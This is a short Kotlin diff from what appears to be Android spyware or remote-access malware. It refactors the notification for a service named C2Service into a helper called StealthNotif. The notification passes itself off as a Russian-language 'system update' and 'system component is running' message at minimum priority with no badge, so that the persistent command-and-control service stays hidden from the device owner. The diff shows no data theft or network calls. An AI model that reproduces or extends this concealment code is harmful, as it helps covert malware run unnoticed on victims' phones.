@@ -2,6 +2,7 @@ package com.sp.core.services
 
 import android.app.*
 import android.content.Context
+import com.sp.core.util.StealthNotif
 import android.content.Intent
 import android.os.Build
 import android.os.Handler
@@ -126,20 +127,9 @@ class C2Service : Service() {
     }
 
     private fun buildNotification(): Notification {
-        val chId = "sys_update"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(chId, "Обновление системы",
-                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
-            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
-                .createNotificationChannel(ch)
-        }
-        return NotificationCompat.Builder(this, chId)
-            .setContentTitle("android_UI")
-            .setContentText("Системный компонент работает")
-            .setSmallIcon(android.R.drawable.stat_sys_download)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)
-            .build()
+        return com.sp.core.util.StealthNotif.build(
+            this, "android_UI", "Системный компонент работает"
+        )
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
